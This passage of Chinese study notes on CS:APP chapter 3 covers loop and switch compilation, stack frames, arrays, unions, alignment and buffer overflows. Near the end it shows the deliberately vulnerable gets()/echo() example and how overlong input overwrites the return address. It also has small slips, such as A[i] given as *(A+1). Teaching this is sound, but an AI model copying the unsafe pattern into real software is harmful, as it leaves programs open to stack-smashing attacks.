<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">	<span class="keyword">goto</span> test;</span><br><span class="line">loop:</span><br><span class="line">	body-statement</span><br><span class="line">test:</span><br><span class="line">	t = test-expr;</span><br><span class="line">	<span class="keyword">if</span> (t)</span><br><span class="line">        <span class="keyword">goto</span> loop;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="./3_images/image-20250117223803531-1737379738525-24-1737437293843-30-1737469906157-22-1737469964590-91.png" alt="使用跳转到中间的翻译方法" style="zoom: 67%;" />

<p>第二种翻译方法称为<code>guarded-do</code>，首先用条件分支，如果初始条件不成立就跳过循环，将代码变换为<code>do-while</code>循环，较高等级优化编译可能会这样转化</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">t = test-expr;</span><br><span class="line"><span class="keyword">if</span> (!t)</span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    body-statement</span><br><span class="line">    <span class="title function_">while</span> <span class="params">(test-expr)</span>;</span><br><span class="line">done:</span><br></pre></td></tr></table></figure>

<p>翻译为goto代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">t = test-expr;</span><br><span class="line"><span class="keyword">if</span> (!t)</span><br><span class="line">    <span class="keyword">goto</span> done;</span><br><span class="line">loop:</span><br><span class="line">	body-statement</span><br><span class="line">    t = test-expr;</span><br><span class="line">	<span class="keyword">if</span> (t)</span><br><span class="line">        <span class="keyword">goto</span> loop;</span><br><span class="line">done:</span><br></pre></td></tr></table></figure>

<p>利用这种实现策略，编译器可以优化初始测试的内容，例如认为测试条件总是满足</p>
<img src="./3_images/image-20250120203636483-1737376604715-20-1737437293843-31-1737469906157-23-1737469964590-92.png" alt="image-20250120203636483" style="zoom:67%;" />

<ol start="3">
<li><code>for</code>循环</li>
</ol>
<p><code>for</code>循环产生的代码是while循环的两种翻译之一，取决于优化等级</p>
<ol start="4">
<li><strong>小结</strong></li>
</ol>
<p>综上所述，C 语言中三种形式的所有的循环：<code>do-while</code>、<code>while</code> 和 <code>for</code>，都可以用一种简单的策略来翻译，产生包含一个或多个条件分支的代码。控制的条件转移提供了将循环翻译成机器代码的基本机制。</p>
<h3 id="3-6-8-switch语句"><a href="#3-6-8-switch语句" class="headerlink" title="3.6.8 switch语句"></a>3.6.8 <code>switch</code>语句</h3><p><code>switch</code>语句可以根据一个<strong>整数索引值</strong>进行多重分支，在处理具有多种可能结果的测试时，这种语句特别有用。通过使用跳转表这种数据结构可以实现</p>
<p>​	跳转表是一个数组，表项i是一个代码段的地址，这个代码段实现当开关索引值等于i是程序应该采取的动作</p>
<p>使用跳转表的优点是执行开关语句的时间与开关情况的数量无关。GCC根据开关情况的数量和开关情况值得系数程度来翻译开关语句，当开关情况数量比较多（例如4个以上），并且值得范围跨度比较小时，就会使用跳转表</p>
<img src="./3_images/image-20250120205818159-1737437293843-32-1737469906157-24-1737469964590-93.png" alt="image-20250120205818159" style="zoom:50%;" />

<p>该翻译给出了跳转表<code>jt</code>的结构，以及如何访问它。作为对C语言的扩展，GCC支持这样的表。</p>
<p>原始的C代码有针对值100、102-104和106的情况，但是变量开关n可以是任意整数。编译器首先将n减去100，把取值范围移到0到6之间，创建一个新的程序变量，在我们的C版本中称为index。补码表示的负数会映射成无符号表示的大正数，利用这一事实，将index看作无符号值，从而进一步简化了分支的可能性。因此可以通过测试index是否大于6来判定index是否在0~6范围之外</p>
<img src="./3_images/image-20250120211633086-1737437293843-33-1737469906157-25-1737469964590-94.png" alt="image-20250120211633086" style="zoom: 50%;" />

<p>执行switch语句的关键步骤是通过跳转表来访问代码的位置，在C代码中是第16行，一条<code>goto</code>语句引用了跳转表<code>jt</code>。GCC支持计算<code>goto</code>，是对C语言的扩展。在我们的汇编代码版本中，类似的操作是在第5行，<code>jmp</code>指令的操作数有前缀<code>&#39;*&#39;</code>，表明这是一个间接跳转，操作数指定一个内存位置，索引由寄存器<code>%rsi</code>给出，这个寄存器保存着index的值</p>
<img src="./3_images/image-20250120212339760-1737437293843-34-1737469906157-27-1737469964590-95.png" alt="image-20250120212339760" style="zoom:67%;" />

<p>执行 <code>switch</code> 语句的关键步骤是通过跳转表来访问代码位置，使用跳转表是一种非常有效的实现多重分支的方法。甚至当 <code>switch</code> 语句有上百种情况的时候，也可以只用一次跳转表访问去处理。</p>
<h2 id="3-7-过程"><a href="#3-7-过程" class="headerlink" title="3.7 过程"></a>3.7 过程</h2><p>过程是软件中一种很重要的抽象。它提供了一种封装代码的方式，用一组指定的参数和一个可选的返回值实现了某种功能。然后可以在程序不同的地方调用这个函数。不同编程语言中，过程的形式多样：函数（function）、方法（method）、子例程（subroutine）、处理函数（handler）等等，但是它们有一些共有的特性</p>
<p><strong>为讨论方便，假设</strong>过程<code>P</code>调用过程<code>Q</code>，<code>Q</code> 执行后返回到 <code>P</code>。这些动作包括下面一个或多个机制：</p>
<ul>
<li>传递控制。在进入过程 <code>Q</code> 的时候，程序计数器必须被设置为 <code>Q</code> 的代码的起始地址，然后在返回时，要把程序计数器设置为 <code>P</code> 中调用 <code>Q</code> 后面那条指令的地址。</li>
<li>传递数据。<code>P</code> 必须能够向 <code>Q</code> 提供一个或多个参数，<code>Q</code> 必须能够向 <code>P</code> 返回一个值。</li>
<li>分配和释放内存。在开始时，<code>Q</code> 可能需要为局部变量分配空间，而在返回前，又必须释放这些存储空间。</li>
</ul>
<h3 id="3-7-1-运行时栈"><a href="#3-7-1-运行时栈" class="headerlink" title="3.7.1 运行时栈"></a>3.7.1 运行时栈</h3><p>C语言过程调用机制的一个关键特性（大多数语言也是如此）在于使用了栈数据结构提供的后进显出的内存管理原则。</p>
<p>如3.4.4所讲，x86-64的栈向低地址方向增长，而栈指针<code>%rsp</code>指向栈顶元素。可以用<code>pushq</code>和<code>popq</code>指令将数据存入栈中或是从栈中取出。将栈指针减小一个适当的量可以为没有指定初始值的是数据在栈上分配空间。类似的，可以通过增加栈指针来释放空间。</p>
<img src="./3_images/image-20250121122226080-1737437293843-35-1737469906157-28-1737469964590-96.png" alt="image-20250121122226080" style="zoom: 67%;" />

<p>当x86-64过程需要的存储空间超过寄存器能够存放的大小时，就会在栈上分配空间。这个部分称为过程的栈帧（stack frame）</p>
<p>图3-25给出了运行时栈的通用结构，包括把它划分为栈帧。当前正在执行的过程的帧总是正在栈顶。</p>
<blockquote>
<p>当过程P调用Q时，会把返回地址压入栈中，指明当Q返回时，要从P程序的哪个位置继续执行。我们把这个返回地址当作P栈帧的一部分，因为它存放的是与P相关的状态。</p>
<p>Q的代码会扩展当前栈的边界，分配它的栈帧所需的空间。在这个空间中，它可以是保存寄存器的值，分配局部变量空间，为它调用的过程设置参数。</p>
</blockquote>
<p>大多数过程的栈帧是定长的。通过寄存器，过程P可以传递最多六个整数值（也就是指针和整数），但是如果Q需要更多的参数，P可以在调用Q之前在自己的栈帧中存储好这些参数</p>
<h3 id="3-7-2-转移控制"><a href="#3-7-2-转移控制" class="headerlink" title="3.7.2 转移控制"></a>3.7.2 转移控制</h3><p>将控制从函数P转移到函数Q只需要简单地把程序计数器（PC）设置为Q的代码地起始位置。不过，当稍后从Q返回的时候，处理器必须记录好它所需要继续P的执行的代码占位置。在x86-64机器中，这个信息是用指令<code>call Q</code>调用过程Q来记录的。</p>
<p>该指令会把地址A压入栈中。并将PC设置为Q的起始地址。压入的地址A被称为返回地址，是紧跟在<code>call</code>指令后面的那条指令的地址。对应的指令<code>ret</code>会从栈中弹出地址A，并把PC设置为A</p>
<p><strong>总之，<code>call</code>指令只有一个目标，即指明被调用过程起始的指令地址</strong></p>
<h3 id="3-7-3-数据传送"><a href="#3-7-3-数据传送" class="headerlink" title="3.7.3 数据传送"></a>3.7.3 数据传送</h3><p>x86-64中，可以通过寄存器最多传递6个整数（整数和指针）参数。寄存器的使用是有特殊顺序的，寄存器使用的名字取决于要传递的数据类型的大小，如下图所示：</p>
<p><img src="/./3_images/image-20250121125818471-1737437293843-36-1737469906157-29-1737469964590-97.png" alt="image-20250121125818471"></p>
<p>会根据参数在参数列表中的顺序为它们分配寄存器，可以通过64位寄存器适当的部分访问小于64位的参数。例如，如果第一个参数是32位的，那么可以用<code>%edi</code>来访问</p>
<p>如果一个函数有大于6个整型参数，超出6个的部分就要通过栈来传递。</p>
<blockquote>
<p>假设过程：调用Q，有n个整型参数，且n&gt;6.那么P的代码分配的栈帧必须要能容纳7到n号参数的存储空间，如图3-25所示。要把参数1<del>6复制到对应的寄存器，把参数7</del>n放到栈上，而参数7位于栈顶。<strong>通过栈传递参数时，所有数据大小都向8的倍数对齐</strong>。参数到位以后，程序就可以执行<code>call</code>命令将控制转移到过程Q了。过程Q可以通过寄存器访问参数，有必要的话也可以通过栈访问。相应的，如果Q也调用了某个有超过6个参数的函数，他也需要在自己的栈帧中为超出6个部分的参数分配空间</p>
</blockquote>
<h3 id="3-7-4-栈上的局部存储"><a href="#3-7-4-栈上的局部存储" class="headerlink" title="3.7.4 栈上的局部存储"></a>3.7.4 栈上的局部存储</h3><p>局部数据必须存放在内存中，常见的情况包括：</p>
<ul>
<li>寄存器不足够存放所有本地数据</li>
<li>对一个局部变量使用地址运算符<code>&amp;</code>，因此必须能够为它产生一个地址</li>
<li>某些局部变量时数组或结构，因此必须能够通过数组或结构引用被访问到</li>
</ul>
<p>运行时栈提供了一种简单的、在需要时分配、函数完成时释放局部存储的机制。</p>
<h3 id="3-7-5-寄存器中的局部存储空间"><a href="#3-7-5-寄存器中的局部存储空间" class="headerlink" title="3.7.5 寄存器中的局部存储空间"></a>3.7.5 寄存器中的局部存储空间</h3><p>寄存器时唯一被所有过程共享的资源。虽然在给定时刻只有一个过程时活动的，但仍然必须确保当一个过程（调用者）调用另一个过程（被调用者）时，被调用者不会覆盖调用者稍后会使用的寄存器值。</p>
<p>根据惯例，寄存器 <code>%rbx</code>、<code>%rbp</code> 和 <code>%r12~%r15</code> 被划分为被调用者保存寄存器。</p>
<blockquote>
<p>当过程P调用过程Q时，Q必须保存在这些寄存器的值，保证它们的值在Q返回到P时与Q被调用时是一样的。</p>
<p>过程Q保存一个寄存器的值不变，要么就是根本不去改变它，要么就是把原始值压入栈中，改变寄存器的值，然后在返回前从栈中弹出旧值。</p>
<p>压入寄存器的值会在栈帧中创建标号为“被保存的寄存器”的一部分，如3-25所示。</p>
</blockquote>
<p>所有其它寄存器，除了栈指针<code>%rsp</code>，都分类为调用者保存寄存器。这就意味着任何函数都能修改它们。</p>
<h3 id="3-7-6-递归过程"><a href="#3-7-6-递归过程" class="headerlink" title="3.7.6 递归过程"></a>3.7.6 递归过程</h3><p>每个过程调用在栈中都有它自己的私有空间，因此多个未完成调用的局部变量不会相互影响。此外，栈的原则很自然的就提供了适当的策略，当过程被调用时分配局部存储，当返回时释放存储。</p>
<p>递归调用一个函数本身与调用其他函数是一样的。栈提供了一种机制，每次函数调用都有它自己私有的状态信息（保存的返回位置和被调用者保存寄存器的值）、存储空间。如果需要它还可以提供局部变量存储。栈分配和释放的规则很自然地就与函数调用-返回地顺序匹配。这种实现函数调用和返回地方法甚至对更复杂地情况也使用</p>
<h2 id="3-8-数组分配和访问"><a href="#3-8-数组分配和访问" class="headerlink" title="3.8 数组分配和访问"></a>3.8 数组分配和访问</h2><p>C语言中的数组是一种将标量数据聚集成更大数据类型的方式。C语言的一个不同寻常的特点是可以产生指向数组中元素的指针，并对这些指针进行运算。在机器代码中，这些指针会被翻译成地址计算</p>
<h3 id="3-8-1-基本原则"><a href="#3-8-1-基本原则" class="headerlink" title="3.8.1 基本原则"></a>3.8.1 基本原则</h3><p>作为示例，看看下面这样的声明</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> A[<span class="number">12</span>];</span><br><span class="line"><span class="type">char</span> *B[<span class="number">8</span>];</span><br><span class="line"><span class="type">int</span>  C[<span class="number">6</span>];</span><br><span class="line"><span class="type">double</span> *D[<span class="number">5</span>];</span><br></pre></td></tr></table></figure>

<p>这些声明会产生带下列参数的数组</p>
<p><img src="/./3_images/image-20250121170212179-1737469964589-64.png" alt="image-20250121170212179"></p>
<p>x86-64的内存引用指令可以用来简化数组访问</p>
<blockquote>
<p>假设E是一个int型的数据，而我们想计算E[i]，在此，E的地址存放在寄存器<code>%rdx</code>中，而i存放在寄存器<code>%rcx</code>中，然后指令</p>
<p><code>movl	(%rdx, %rcx, 4)， %eax</code></p>
<p>会执行地址计算<em>Xe+4 i</em>,并将结果存放到寄存器<code>%eax</code>中。<strong>允许伸缩因子1、2、4和8覆盖了所有基本简单数据类型的大小</strong></p>
</blockquote>
<h3 id="3-8-2-指针运算"><a href="#3-8-2-指针运算" class="headerlink" title="3.8.2 指针运算"></a>3.8.2 指针运算</h3><p>C语言允许对指针进行预算，而计算出来的值会根据该指针引用的数据类型的大小进行伸缩。</p>
<blockquote>
<p>也就是说，如果p是一个指向类型为T的数据的指针，p的值为x<sub>p</sub>+<code>L·i</code>，这里L是数据类型T的大小</p>
</blockquote>
<p>可以对数组和指针应用数组下标操作。数组引用 <code>A[i]</code> 等同于表达式 <code>*(A+1)</code>，它计算第 <code>i</code> 个数组元素的地址，然后访问这个内存位置。</p>
<p><img src="/./3_images/image-20250121172449027-1737469964589-65.png" alt="image-20250121172449027"></p>
<p>这些例子中，可以看到返回数组值的操作类型为int，因此涉及4字节操作（例如<code>movl</code>）和寄存器（<code>%ebx</code>)。</p>
<h3 id="3-8-3-嵌套的数组"><a href="#3-8-3-嵌套的数组" class="headerlink" title="3.8.3 嵌套的数组"></a>3.8.3 嵌套的数组</h3><p>当创建数组的数组时，数组分配和引用的一般原则也是成立的。</p>
<blockquote>
<p>声明 <code>int A[5][3];</code> 等价于 <code>typedef int row3_t[3]; row3_t A[5];</code>。</p>
<p>数据类型 <code>row3_t</code> 被定义为一个 3 个整数的数组，数组 <code>A</code> 包含 5 个这样的元素，每个元素需要 12 个字节来存储 3 个整数，整个数组的大小就是 <code>4*5*3=60</code> 字节。</p>
</blockquote>
<p>数组元素在内存中按照**“行优先”**的策略，将 <code>A</code> 看作一个有 5 个元素的数组，每个元素都是 3 个 <code>int</code> 的数组。</p>
<h3 id="3-8-4-定长数组"><a href="#3-8-4-定长数组" class="headerlink" title="3.8.4 定长数组"></a>3.8.4 定长数组</h3><p>主要介绍了<code>O1</code>优化，不详说</p>
<h3 id="3-8-5-变长数组"><a href="#3-8-5-变长数组" class="headerlink" title="3.8.5 变长数组"></a>3.8.5 变长数组</h3><p><code>ISO C99</code>引入了一种功能，允许数组的维度是表达式，在数组被分配的时候才计算出来</p>
<p>在变长版本的C版本中，我们可以将一个数组声明如下：<code>int A[expr1][expr2]</code>，遇到这个声明时，通过对表达式<code>expr1</code>和<code>expr2</code>求值来确定数组的维度</p>
<h2 id="3-9-异质的数据结构"><a href="#3-9-异质的数据结构" class="headerlink" title="3.9 异质的数据结构"></a>3.9 异质的数据结构</h2><p>C语言提供了两种将不同类型的对象组合到一起创建数据类型的机制：<code>结构(struct)</code>，用关键字struct来声明，将多个对象集合到一个单位中：<code>联合(union)</code>，用关键字union来声明，允许用几种不同的类型来引用一个对象</p>
<h3 id="3-9-1-结构"><a href="#3-9-1-结构" class="headerlink" title="3.9.1 结构"></a>3.9.1 结构</h3><p>C语言的<code>struct</code>声明创建一个数据类型，将可能不同类型的对象聚合到一个对象中。用名字来引用结构的各个组成部分。类似于数组的实现，<strong>结构的所有组成部分都存放在内存中一段连续的区域内</strong>，而指向结构的指针就是结构第一个字节的地址。</p>
<p>编译器维护关于每个结构类型的信息，指示每个字段（field）的字节偏移。它以这些偏移作为内存引用指令中的位移，从而产生对结构元素的引用。</p>
<h3 id="3-9-2-联合"><a href="#3-9-2-联合" class="headerlink" title="3.9.2 联合"></a>3.9.2 联合</h3><p>联合提供了一种方式，能够规避C语言的类型系统，允许以多种类型来引用一个对象。它们式用不用的字段来引用相同的内存块。</p>
<p>在一些上下文中，联合十分有用。但是，它也能引起一些讨厌的错误，因为它们绕过了C语言类型系统提供的安全措施。一种应用情况是，我们事先知道对一个数据结构中的两个不同字段的使用式互斥的，那么将这两个字段声明为联合的一部分，而不是结构的一部分，会减小分配空间的总量</p>
<p>一个联合的总的大小等于它最大字段的大小。</p>
<p><strong>联合还可以用来访问不同数据类型的位模式。</strong></p>
<p>假设我们使用简单的强制类型转化将一个double类型的值d转换为<code>unsigned int</code>类型的<code>u</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> u = (<span class="type">unsigned</span> <span class="type">long</span>) d;</span><br></pre></td></tr></table></figure>

<p>值u会是d的整数表示。除了d的值为0.0的情况外，u的位表示会与d的很不一样</p>
<p>再看下面这段代码，从一个<code>double</code>产生一个<code>unsigned long</code>类型的值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">double2bits</span> <span class="params">(<span class="type">double</span> d)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> </span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="type">double</span> d;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> u;</span><br><span class="line">	&#125; temp;</span><br><span class="line">    temp.d = d;</span><br><span class="line">    <span class="keyword">return</span> temp.u;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在这段代码中，我们以一种数据类型来存储联合中的参数，又以另一种数据类型来访问它。结果会是u具有和d一样的位表示，包括符号位字段、指数和尾数</p>
<p><strong>当用联合来将各种不同大小的数据类型结合到一起时，字节顺序问题就变得很重要了</strong></p>
<p>假设我们写了一个过程，它以两个4字节的unsigned的位模式，创建一个8字节的double：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> <span class="title function_">uu2double</span> <span class="params">(<span class="type">unsigned</span> word0, <span class="type">unsigned</span> word1)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="type">double</span> d;</span><br><span class="line">        <span class="type">unsigned</span> u[<span class="number">2</span>];</span><br><span class="line">	&#125;temp;</span><br><span class="line">    </span><br><span class="line">    temp.u[<span class="number">0</span>] = word0;</span><br><span class="line">    temp.u[<span class="number">1</span>] = word1;</span><br><span class="line">    <span class="keyword">return</span> temp.d;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在x86-64这样的小端法机器上，参数word0是d的低位4个字节，而word1是高位4个字节。在大端法机器上，这两个参数的角色正好相反。</p>
<h3 id="3-9-3-数据对齐"><a href="#3-9-3-数据对齐" class="headerlink" title="3.9.3 数据对齐"></a>3.9.3 数据对齐</h3><p>许多计算机系统对基本数据类型的合法地址做出了一些限制，要求某种类型对象的地址必须是某个值<code>K</code>(通常是<code>2</code>、<code>4</code>、<code>8</code>)的倍数。这种对齐限制简化了形成处理器和内存系统之间接口的硬件设计</p>
<blockquote>
<p>例如，假设一个处理器总是从内存中取出8个字节，则地址必须为8的倍数。如果我们能保证将所有double类型数据的地址对齐成8的倍数，那么就可以用一个内存操作来读或者写值了。否则我们可能需要执行两次内存访问，因为对象可能被分放在两个8字节内存块中</p>
</blockquote>
<p>无论数据是否对齐，x86-64硬件都能正确工作。不过，Intel 还是建议要对齐数据以提高内存系统的性能。对齐原则是任何 <code>K</code> 字节的基本对象的地址必须是 <code>K</code> 的倍数，这条原则会得到如下对齐：</p>
<img src="./3_images/image-20250121190635477-1737469964589-66.png" alt="image-20250121190635477" style="zoom: 67%;" />

<p>确保每种数据类型都是按照指定方式来组织和分配，即每种类型的对象都满足它的对齐限制，就可以保证实施对齐。</p>
<p><strong>编译器在汇编代码中放入命令，指明全局数据所需的对齐</strong></p>
<p>例如3.6.8节开始的跳转表的汇编代码声明在第2行包含下面这样的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.align 8</span><br></pre></td></tr></table></figure>

<p>这就保证了它后面的数据（在此是跳转表的开始）的起始地址是8的倍数。因为每个表项长8个字节，后面的元素都会遵守8字节对齐的限制</p>
<p><strong>对于包含结构的代码，编译器可能需要在字段的分配中插入间隙，以保证每个结构元素都满足它的对齐要求</strong></p>
<p>比如下面的结构声明：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">S1</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设编译器用最小的9字节分配，画出图来是这样的：</p>
<img src="./3_images/image-20250121191924908-1737469964589-67.png" alt="image-20250121191924908" style="zoom: 50%;" />

<p>它是不可能满足字段i（偏移为0）和j（偏移为5）的4字节对齐要求的。取而代之的是，编译器在字段c和j之间加入了一个3字节的间隙（蓝色阴影表示）</p>
<img src="./3_images/image-20250121192059830-1737469964589-68.png" alt="image-20250121192059830" style="zoom:50%;" />

<p>结果，j的偏移量是8，而整个结构的大小是12字节。</p>
<p>此外编译器必须保证任何<code>struct S1 *</code>的类型的指针p都满足4字节对齐。用我们前面的符号，设指针p的值为x<sub>p</sub>,那么，x<sub>p</sub>必须是4的倍数。这就保证了 p -&gt; i (地址x<sub>p</sub>)和 p -&gt; j(地址x<sub>p</sub>+8)都满足它们的4字节对齐要求。</p>
<h2 id="3-10-在机器级程序中将控制和数据结合起来"><a href="#3-10-在机器级程序中将控制和数据结合起来" class="headerlink" title="3.10 在机器级程序中将控制和数据结合起来"></a>3.10 在机器级程序中将控制和数据结合起来</h2><p>到目前为止，我们已经分别讨论机器级代码如何实现程序的控制部分和如何实现不同的数据结构。</p>
<p>在本节中，我们会看看数据和控制如何交互。</p>
<ul>
<li>首先深审视一下指针，它是C编程语言中最重要的概念之一，但是许多程序员对它的理解都非常浅显 。</li>
<li>我们复习符号调试器 GDB 的使用，用它仔细检查机器级程序的详细运行。</li>
<li>接下来，看看理解机器级程序如何帮助我们研究缓冲区溢出，这是现实世界许多系统中一种很重要的安全漏洞。</li>
<li>最后，查看机器级程序如何实现函数要求的栈空间大小在每次执行时都可能不同的情况。</li>
</ul>
<h3 id="3-10-1-理解指针"><a href="#3-10-1-理解指针" class="headerlink" title="3.10.1 理解指针"></a>3.10.1 理解指针</h3><p>略</p>
<h3 id="3-10-2-应用：使用GDB调试器"><a href="#3-10-2-应用：使用GDB调试器" class="headerlink" title="3.10.2 应用：使用GDB调试器"></a>3.10.2 应用：使用GDB调试器</h3><p>GNU的调试器GDB提供了许多有用的特性，支持机器级程序的运行时评估的分析</p>
<p><img src="/./3_images/image-20220914202022697-1737469964589-69.png" alt="image-20220914202022697"></p>
<h3 id="3-10-3-内存越界引用和缓冲区溢出"><a href="#3-10-3-内存越界引用和缓冲区溢出" class="headerlink" title="3.10.3 内存越界引用和缓冲区溢出"></a>3.10.3 内存越界引用和缓冲区溢出</h3><p>我们已经看到，C对于数组引用不进行任何边界检查，而且局部变量和状态信息（例如保存的寄存器值和返回地址）都存放在栈中。这两种情况结合到一起就能导致严重的程序错误，对越界的数组元素的写操作会破坏存储在栈中的状态信息。当程序使用这个被破坏的状态，试图重新加载寄存器或执行<code>ret</code>指令时，就会出现很严重的错误</p>
<p>一种特别常见的状态破坏称为<strong>缓冲区溢出</strong>。通常，在栈中分配某个字符数组来保存一个字符串，但是字符串的长度超出了为数组分配的空间。下面这个程序示例就说明了这个问题</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*Implementation of library function gets()*/</span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> c;</span><br><span class="line">    <span class="type">char</span> *dest = s;</span><br><span class="line">    <span class="keyword">while</span> ((c = getchar()) != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; c != EOF)</span><br><span class="line">        *dest++ = c;</span><br><span class="line">    <span class="keyword">if</span> (c == EOF &amp;&amp; dest == s)</span><br><span class="line">        <span class="comment">/* no characers read*/</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    *dest++ = <span class="string">&#x27;\0&#x27;</span>;	<span class="comment">/* Terminate string*/</span></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* read input line and write it back */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">echo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">8</span>];<span class="comment">/* way too small!*/</span></span><br><span class="line">    gets(buf);</span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>前面的代码给出了库函数<code>gets</code>的一个实现，用来说明这个函数的严重问题。它从标准输入读入一行，在遇到一个回车换行字符或某个错误时停止。它将这个字符串复制到参数s指明的位置，并在字符串结尾加上<code>null</code>的字符。在函数<code>echo</code>中，我们使用了<code>gets</code>，这个函数只是简单的从标准读入中读入一行，再把它回送到标准输出。</p>
<p><code>gets</code>的问题是它没办法确定是否为保存整个字符串分配了足够的空间。在<code>echo</code>示例中，我们故意将缓冲区设置的非常小——只有8字节长。任何超过7个字符的字符串都将导致写越界</p>
<p>检查GCC为<code>echo</code>产生的汇编代码，看看栈是如何组织的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo:</span><br><span class="line">	subq	$24, %rsp		Allocate 24 bytes on stack</span><br><span class="line">	movq	%rsp, %rdi		Compute buf as %rsp</span><br><span class="line">	call	gets			Call gets</span><br><span class="line">	movq	%rsp, %rdi		Compute buf as %rsp</span><br><span class="line">	call	puts			Call puts</span><br><span class="line">	addq	$24, %rsp		Deallocate stack space</span><br><span class="line">	ret						Return </span><br></pre></td></tr></table></figure>

<p>该程序将栈指针减去了24（L2），在栈上分配了24个字节。字符数组<code>buf</code>位于栈顶，可以看到，<code>%rsp</code>被复制到<code>%rdi</code>作为调用<code>gets</code>和<code>puts</code>的参数。这个调用的参数和存储的返回指针之间的16字节是未被使用的。只要用户输入不超过7个字符，<code>gets</code>返回的字符串（包括结尾的null)就能够放进为<code>buf</code>分配的空间里。不过，长一些的字符串就会导致<code>gets</code>覆盖栈上存储的某些信息。随着字符串变长，下面的信息会被破坏：</p>
<table>
<thead>
<tr>
<th align="center">输入的字符数量</th>
<th align="center">附加的被破坏的状态</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0~7</td>
<td align="center">无</td>
</tr>
<tr>
<td align="center">9~23</td>
<td align="center">未被使用的栈空间</td>
</tr>
<tr>
<td align="center">24~31</td>
<td align="center">返回地址</td>
</tr>
<tr>
<td align="center">32+</td>
<td align="center">caller中保存的状态</td>
</tr>
</tbody></table>
<p>字符串到23个字符之前都没有严重的后果，但是超过以后，返回指针的值以及更多可能的保存状态会被破坏，那么<code>ret</code>指令会导致程序跳转到一个完全意想不到的位置</p>
<h3 id="3-10-4-对抗缓冲区溢出攻击"><a href="#3-10-4-对抗缓冲区溢出攻击" class="headerlink" title="3.10.4 对抗缓冲区溢出攻击"></a>3.10.4 对抗缓冲区溢出攻击</h3><ol>
<li><strong>栈随机化</strong></li>
</ol>
